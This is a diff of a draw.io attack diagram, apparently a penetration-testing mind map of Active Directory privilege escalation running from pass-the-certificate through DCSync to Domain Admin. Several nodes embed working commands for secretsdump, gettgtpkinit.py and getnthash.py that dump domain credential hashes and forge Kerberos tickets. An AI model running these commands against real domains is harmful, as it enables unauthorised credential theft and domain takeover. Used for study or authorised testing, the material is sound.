@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-04-30T10:27:27.734Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" etag="05ofQYw5OF_gFXjiKzFd" version="24.3.1" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2024-04-30T11:20:46.641Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" etag="PWCN4zzAHTSUXDhm46a2" version="24.3.1" type="github" pages="7">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -373,28 +373,41 @@
         <mxCell id="QkhrWf05NAjAX-w3R0dh-1" value="création d&#39;un compte machine (MAQ)" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
           <mxGeometry x="1399" y="1130" width="260" height="90" as="geometry" />
         </mxCell>
-        <mxCell id="AiW3-Z7aOuHyVLjimw17-4" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="Kfw4rbIWasHMYPfyiLrn-1" target="AiW3-Z7aOuHyVLjimw17-3">
+        <mxCell id="RcJsrnn1SgcJtgKbqCFV-6" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="1" source="Kfw4rbIWasHMYPfyiLrn-1" target="RcJsrnn1SgcJtgKbqCFV-2">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="Kfw4rbIWasHMYPfyiLrn-1" value="Pass the certificate" style="whiteSpace=wrap;html=1;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="2554" y="920" width="120" height="60" as="geometry" />
-        </mxCell>
-        <mxCell id="AiW3-Z7aOuHyVLjimw17-5" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=0;exitDx=0;exitDy=0;" edge="1" parent="1" source="AiW3-Z7aOuHyVLjimw17-3">
-          <mxGeometry relative="1" as="geometry">
-            <mxPoint x="2504.9411764705883" y="267.5" as="targetPoint" />
-          </mxGeometry>
-        </mxCell>
-        <object label="&lt;div&gt;DCsync&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;secretdump.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="secretsdump -k -no-pass OLYMPIQUELYONNAIS.COM/&#39;DC01$&#39;@DC03.OLYMPIQUELYONNAIS.COM" id="AiW3-Z7aOuHyVLjimw17-3">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
-            <mxGeometry x="2554" y="820" width="120" height="60" as="geometry" />
+        <object label="Pass the certificate" create_ticket="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="Kfw4rbIWasHMYPfyiLrn-1">
+          <mxCell style="whiteSpace=wrap;html=1;rounded=1;fillColor=default;strokeColor=#d79b00;" parent="1" vertex="1">
+            <mxGeometry x="2554" y="920" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="CO8ryZpvelLdmZuHYNJb-1" value="KRBTGT hash" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#520700;strokeColor=#B20000;fontColor=#ffffff;" vertex="1" parent="1">
-          <mxGeometry x="2700" y="187.5" width="160" height="72.5" as="geometry" />
-        </mxCell>
         <mxCell id="RcJsrnn1SgcJtgKbqCFV-1" value="Domain Admin right" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#c64600;strokeColor=#B20000;fontColor=#ffffff;" vertex="1" parent="1">
-          <mxGeometry x="2440" y="180" width="150" height="87.5" as="geometry" />
+          <mxGeometry x="2510" y="180" width="150" height="87.5" as="geometry" />
         </mxCell>
+        <mxCell id="RcJsrnn1SgcJtgKbqCFV-7" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="RcJsrnn1SgcJtgKbqCFV-2" target="RcJsrnn1SgcJtgKbqCFV-4">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <object label="&lt;div&gt;DCsync&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;secretdump.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="secretsdump -k -no-pass OLYMPIQUELYONNAIS.COM/&#39;DC01$&#39;@DC03.OLYMPIQUELYONNAIS.COM" id="RcJsrnn1SgcJtgKbqCFV-2">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
+            <mxGeometry x="2730" y="920" width="120" height="60" as="geometry" />
+          </mxCell>
+        </object>
+        <mxCell id="RcJsrnn1SgcJtgKbqCFV-5" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=0;exitDx=0;exitDy=0;" edge="1" parent="1" source="RcJsrnn1SgcJtgKbqCFV-4" target="RcJsrnn1SgcJtgKbqCFV-1">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="RcJsrnn1SgcJtgKbqCFV-4" value="Get NT hash of domains admins" style="whiteSpace=wrap;html=1;rounded=1;" vertex="1" parent="1">
+          <mxGeometry x="2920" y="920" width="120" height="60" as="geometry" />
+        </mxCell>
+        <object label="&lt;div&gt;Extract NT hash of certificate&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;getnthash.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="getnthash.py -key 0749d5ec9a1bca37d57ca7e9388f00b4c31c9ac0df0c3583484672764ff4752c -dc-ip 10.240.5.1 &#39;olympiquelyonnais.com&#39;/&#39;DC01\$&#39;" id="LUB5KluwDhGO-CHIsPKq-1">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+            <mxGeometry x="2730" y="1010" width="120" height="60" as="geometry" />
+          </mxCell>
+        </object>
+        <object label="&lt;div&gt;ASREP key&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;gettgtpkinit.py&lt;/font&gt;&lt;/div&gt;" cmd="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="LUB5KluwDhGO-CHIsPKq-3">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+            <mxGeometry x="2554" y="1010" width="120" height="60" as="geometry" />
+          </mxCell>
+        </object>
       </root>
     </mxGraphModel>
   </diagram>
